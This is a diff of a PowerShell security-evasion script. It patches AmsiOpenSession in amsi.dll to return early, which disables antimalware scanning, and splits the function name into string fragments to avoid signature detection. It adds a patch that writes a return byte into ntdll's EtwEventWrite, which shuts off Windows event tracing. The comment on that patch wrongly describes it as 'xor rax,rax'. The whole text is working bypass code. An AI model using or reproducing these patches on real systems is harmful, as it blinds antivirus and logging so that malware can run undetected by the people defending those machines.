@@ -34,7 +34,8 @@ if([System.IntPtr]::Size -eq 4){
     }
 }else
 {
-    [IntPtr]$funcSession = LookupFunc Amsi.dll AmsiOpenSession
+    $f = 'Ams'+'iOpenSession'
+    [IntPtr]$funcSession = LookupFunc amsi.dll $f
     $xorrax = [Byte[]] (0x48,0x31,0xC0)
     # xor rax,rax
     [bool]$pageresult = PageChange $funcSession 0x40
@@ -44,4 +45,16 @@ if([System.IntPtr]::Size -eq 4){
     [System.Runtime.InteropServices.Marshal]::WriteByte($funcSession,2,$xorrax[2])
     PageChange $funcSession 0x20
     }
+}
+
+[IntPtr]$funcSession = LookupFunc ntdll.dll EtwEventWrite
+Start-Sleep -Milliseconds 5000
+$xorrax = [Byte[]] (0xC3)
+# xor rax,rax
+[bool]$pageresult = PageChange $funcSession 0x40
+
+if ($pageresult)
+{
+	[System.Runtime.InteropServices.Marshal]::WriteByte($funcSession,0,$xorrax[0])
+	PageChange $funcSession 0x20
 }
